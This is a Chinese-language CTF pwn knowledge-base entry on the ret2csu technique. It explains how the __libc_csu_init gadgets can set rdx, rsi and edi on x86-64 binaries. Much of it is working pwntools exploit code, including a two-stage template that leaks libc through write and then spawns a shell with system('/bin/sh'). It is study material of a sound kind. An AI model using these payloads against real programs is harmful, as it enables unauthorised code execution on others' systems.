---
category: pwn
tags: [ret2csu, __libc_csu_init, universal_gadget, rdx, rsi, edi, rop, 通用gadget, 寄存器控制, 间接调用]
triggers: [ret2csu, __libc_csu_init, no pop rdx, universal gadget, control rdx rsi, csu gadget, 没有gadget, 控制rdx, 通用ROP]
related: [rop_chain, ret2libc, stack_pivot, one_gadget]
---

# ret2csu 攻击

## 什么时候用

需要控制 `rdx`、`rsi`、`edi` 三个寄存器来调用函数，但二进制本身没有 `pop rdx; ret` 等直接 gadget。几乎所有动态链接的 x86-64 ELF 都包含 `__libc_csu_init` 函数，其中有两段可利用的"万能 gadget"。

## 前提条件

- **x86-64 动态链接 ELF**（含 `__libc_csu_init`，静态编译或 PIE strip 后可能没有）
- **栈溢出**：能控制返回地址和足够的栈空间（约 ~0x80 字节）
- **知道一个可 call 的地址**：gadget 2 通过 `call [r12 + rbx*8]` 间接调用，r12 需指向一个**存放函数地址的内存**（如 GOT 表项）
- ⚠️ `edi` 只有低 32 位被设置（`mov edi, r13d`），无法传递完整 64 位第一参数

## 攻击步骤

### 1. 定位两段 gadget

在 `__libc_csu_init` 函数末尾找到两段关键代码：

```bash
objdump -d ./vuln | grep -A 30 __libc_csu_init
```

**Gadget 1（pop 链）**——函数末尾：
```asm
pop rbx        ; 设为 0
pop rbp        ; 设为 1（使 rbx+1 == rbp，跳过循环）
pop r12        ; 函数指针所在地址（如 GOT 表项地址）
pop r13        ; -> edi（第一参数，仅低 32 位！）
pop r14        ; -> rsi（第二参数）
pop r15        ; -> rdx（第三参数）
ret
```

**Gadget 2（mov + call）**——函数中部：
```asm
mov rdx, r15       ; rdx = r15
mov rsi, r14       ; rsi = r14
mov edi, r13d      ; edi = r13（32位截断！）
call [r12 + rbx*8] ; 间接调用
add rbx, 1
cmp rbp, rbx
jne .loop          ; rbx != rbp 则循环
; ... 7 次 pop 后 ret
```

### 2. 用 pwntools 自动定位

```python
from pwn import *

elf = ELF('./vuln')
csu_init = elf.sym['__libc_csu_init']

# 手动计算偏移（不同编译器偏移可能不同）
# 用 objdump 确认具体地址
CSU_POP = 0x40089a    # gadget 1: pop rbx ~ ret
CSU_MOV = 0x400880    # gadget 2: mov rdx,r15 ~ call
```

### 3. 构造 payload（通过 call 调用函数）

```python
from pwn import *

context.binary = elf = ELF('./vuln')

CSU_POP  = 0x40089a  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_MOV  = 0x400880  # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]

offset = 72  # 溢出偏移

# 目标：调用 write(1, got_puts, 8) 泄露 libc
payload = b'A' * offset

# Gadget 1: 设置寄存器
payload += p64(CSU_POP)
payload += p64(0)                    # rbx = 0
payload += p64(1)                    # rbp = 1（使循环只执行一次）
payload += p64(elf.got['write'])     # r12 = &write@GOT（call [r12+0*8]）
payload += p64(1)                    # r13 -> edi = 1（stdout）
payload += p64(elf.got['puts'])      # r14 -> rsi = puts@GOT（泄露地址）
payload += p64(8)                    # r15 -> rdx = 8（读取字节数）

# Gadget 2: 执行 mov + call
payload += p64(CSU_MOV)

# call 返回后会执行 add rbx,1; cmp rbp,rbx; 然后 7 次 pop + ret
payload += p64(0) * 7               # 填充 7 个 pop 的值

# 最终返回地址（如回到 main）
payload += p64(elf.sym['main'])

p = process()
p.sendline(payload)
leaked = u64(p.recv(8))
log.success(f"puts@libc: {hex(leaked)}")
p.interactive()
```

### 4. 绕过 call 直接到 ret

如果不想真正执行 call（只需要设置寄存器后继续 ROP），需要让 `call [r12 + rbx*8]` 调用一个什么都不做的函数。常用 `_init` 函数：

```python
# 找 _init 函数的指针（存在于 .dynamic 或 .got 中）
# 在 gdb 中：search-pattern <_init 地址>
# 例如 _init 在 0x400560，找内存中哪里存了这个地址
INIT_PTR = 0x600e38  # 存放 _init 地址的内存位置

payload = b'A' * offset
payload += p64(CSU_POP)
payload += p64(0)              # rbx = 0
payload += p64(1)              # rbp = 1
payload += p64(INIT_PTR)       # r12 -> call [INIT_PTR + 0] = call _init
payload += p64(0)              # r13 -> edi（不关心）
payload += p64(0)              # r14 -> rsi（不关心）
payload += p64(0xdeadbeef)     # r15 -> rdx = 目标值！
payload += p64(CSU_MOV)
payload += p64(0) * 7          # 7 次 pop
payload += p64(NEXT_GADGET)    # 继续 ROP 链
```

### 完整 exploit 模板

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

CSU_POP = 0x40089a
CSU_MOV = 0x400880
POP_RDI = 0x4008a3  # __libc_csu_init 尾部通常也有 pop rdi; ret

OFFSET = 72

p = process()

# --- Stage 1: 用 ret2csu 调用 write(1, puts@GOT, 8) ---
payload1 = b'A' * OFFSET
payload1 += p64(CSU_POP)
payload1 += p64(0) + p64(1)             # rbx=0, rbp=1
payload1 += p64(elf.got['write'])        # r12
payload1 += p64(1)                       # r13 -> edi = stdout
payload1 += p64(elf.got['puts'])         # r14 -> rsi
payload1 += p64(8)                       # r15 -> rdx
payload1 += p64(CSU_MOV)
payload1 += p64(0) * 7
payload1 += p64(elf.sym['main'])

p.sendlineafter(b'> ', payload1)
leaked = u64(p.recv(8))
libc.address = leaked - libc.sym['puts']
log.success(f"libc: {hex(libc.address)}")

# --- Stage 2: system("/bin/sh") ---
payload2 = b'A' * OFFSET
payload2 += p64(POP_RDI)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.sym['system'])

p.sendlineafter(b'> ', payload2)
p.interactive()
```

## 常见坑

- **edi 是 32 位截断**：`mov edi, r13d` 只设置低 32 位。如果第一参数需要完整 64 位地址（如 libc 中的 `/bin/sh`），不能用 ret2csu 设置 rdi，需要另找 `pop rdi; ret`。
- **call 是间接调用**：`call [r12 + rbx*8]` 读取 r12+rbx*8 处的**指针**，不是直接跳转。r12 应该指向 GOT 表项或其他存函数地址的内存。
- **call 后有 7 次 pop**：gadget 2 执行 call 后会继续执行到 gadget 1 的 pop 链，需要在栈上放 7 个填充值（56 字节）。
- **rbp 必须等于 rbx+1**：否则 `cmp rbp, rbx; jne` 会跳回循环。设 rbx=0, rbp=1 是标准做法。
- **PIE 二进制需要泄露基地址**：ret2csu gadget 在二进制内部，PIE 开启时地址随机化。

## 变体

### 只用来设置 rdx

最常见的用法：二进制有 `pop rdi; ret` 和 `pop rsi; pop r15; ret`，但没有 `pop rdx`。只用 ret2csu 设置 rdx，rdi/rsi 用其他 gadget 设置。

### 配合 ret2libc

Stage 1 用 ret2csu 设置参数调用 `write` 泄露 libc 地址，Stage 2 用标准 ret2libc 的 `system("/bin/sh")`。

### 现代替代方案

新版 glibc（2.34+）和 GCC 编译的二进制可能不再包含 `__libc_csu_init`。替代方案：
- 从 libc 中找 `pop rdx; pop rbx; ret`
- 用 [[stack_pivot]] 转移到更大的 ROP 空间

## 相关技术

- [[rop_chain]] — ROP 基础概念和 gadget 查找
- [[ret2libc]] — 标准 libc 泄露和 shell 获取
- [[stack_pivot]] — 溢出空间不够时的替代方案
- [[one_gadget]] — 空间极小时的单地址 shell
